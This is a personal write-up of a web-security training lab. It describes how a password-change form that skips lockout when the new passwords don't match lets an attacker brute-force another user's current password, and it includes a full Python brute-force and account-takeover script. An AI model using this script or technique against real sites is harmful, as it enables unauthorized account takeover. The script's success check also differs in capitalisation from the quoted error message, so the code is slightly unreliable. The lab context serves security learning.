This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- Candidate passwords

---

**Goal:** Brute-force Carlos's password in the password change functionality.

**Analysis:** The app will lock you out, for one minute, if you try changing the password but use the incorrect one. If you try to change the password but use for the new password fields `password1` and then `password2` it will tell you that the `Current password is incorrect`, but it will **NOT** lock you out. 

It does not have session protection to check if the user is the same user who requested the password reset.

To summarise, if you have non matching passwords in the new password fields, it wont lock you out of the app, even if you input an incorrect current password. This should allow me to brute-force the current password. 

_Error info:_ `New passwords do not match.`
- I can use the error info to grep out the matching error message, so that finding the correct password will be easier to see in the burp intruder window. 

_If i use a incorrect current password:_ `Current password is incorrect`

---

![[Pasted image 20240827084603.png]]

![[Pasted image 20240827084808.png]]

One payload `2000` comes back with the response `New passwords do not match`, i then modify the request and match the new password fields, which changes the password for user Carlos. I should now be able to login and complete the lab.

![[Pasted image 20240827084951.png]]

---

**Completed:** _08:48 2024-08-27_

**Extra:** 

```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):
	
	# Log into Wiener's account 
	print('(+) Logging in to wiener account...')
	login_url = url + "/login"
	login_data = {"username": "wiener", "password": "peter"}
	r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

	# Brute-force Carlos's account
	print('(+) Brute-forcing Carlos account...')
	change_pass_url = url + "/my-account/change-password"
	
	with open('passwords.txt', 'r') as f:
		lines = f.readlines()
		
	for pwd in lines:
		pwd = pwd.strip('\n')
		change_pass_data = {"username": "carlos", "current-password": pwd, "new-password-1": "test1", "new-password-2": "test2"}
		r = s.post(change_pass_url, data=change_pass_data, verify=False, proxies=proxies)
		if "New Passwords do not match" in r.text:
			carlos_pwd = pwd
			print("(+) Password found: " + carlos_pwd)
			break
			
	# Login
	if carlos_pwd:
		login_data = {"username": "carlos", "password": carlos_pwd}
		r = requests.post(login_url, data=login_data, verify=False, proxies=proxies)
		if 'Log out' in r.text:
			print('(+) Successfully logged in as Carlos')
		else:
			print('(-) Exploit failed.')
			sys.exit(-1)
	else:
		print('(-) Could not find the password.')
	
			
def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s <url>' % sys.argv[0])
		print('(+) Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)
		
	s = requests.Session()
	url = sys.argv[1]
	access_carlos_account(s, url)

if __name__ == '__main__':
	main()
```


